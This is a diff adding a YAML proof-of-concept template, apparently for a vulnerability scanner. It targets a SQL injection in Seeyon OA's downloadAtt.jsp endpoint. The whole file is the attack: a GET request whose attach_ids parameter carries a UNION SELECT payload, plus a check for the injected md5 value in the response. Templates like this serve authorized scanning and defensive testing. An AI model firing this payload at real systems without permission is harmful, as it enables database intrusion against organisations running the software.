@@ -1,0 +1,22 @@
+id: poc-yaml-seeyon-wooyun-2015-0108235-sqli
+info:
+  name: Seeyon Wooyun 2015 0108235 SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Seeyon Wooyun
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5({{.rand}}),7--
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, md5(rand))
+  output: []
